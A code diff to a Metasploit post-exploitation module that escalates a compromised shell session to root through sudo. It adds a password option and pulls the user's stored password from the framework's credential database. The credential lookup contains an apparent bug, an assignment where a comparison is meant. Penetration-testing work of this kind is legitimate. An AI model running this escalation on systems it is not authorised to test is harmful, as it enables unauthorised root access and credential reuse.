@@ -39,6 +39,10 @@ class Metasploit3 < Msf::Post
 					],
 				'SessionTypes'  => [ 'shell' ] # Need to test 'meterpreter'
 			))
+		register_options([
+                        OptString.new('PASSWORD', [false, "Current Account Password"]),
+                ], self.class)
+
 	end
 
 	# Run Method for when run command is issued
@@ -57,7 +61,11 @@ class Metasploit3 < Msf::Post
 	end
 
 	def get_root
-		password = session.exploit_datastore['PASSWORD']
+		password = (session.exploit_datastore['PASSWORD'] || datastore['PASSWORD'])
+		user = cmd_exec("whoami")
+		password = session.framework.db.creds.find_all { |cred| 
+			cred.user == user and cred.ptype =~ /password/ and cred.service.host.address = session.session_host
+		}.first if password.to_s.empty?
 		if password.to_s.empty?
 			print_status "No password available, trying a passwordless sudo."
 		else
@@ -77,6 +85,7 @@ class Metasploit3 < Msf::Post
 	end
 
 	# TODO: test on more platforms
+	# TODO: figure out how to execute with a password which includes !
 	def askpass_sudo(password)
 		if password.to_s.empty?
 			begin
@@ -112,7 +121,7 @@ class Metasploit3 < Msf::Post
 			rescue
 				print_error "SUDO: Sudo with a password failed. Check the session log."
 			end
-			# askpass_cleanup(askpass_sh)
+			askpass_cleanup(askpass_sh)
 		end
 	end
 
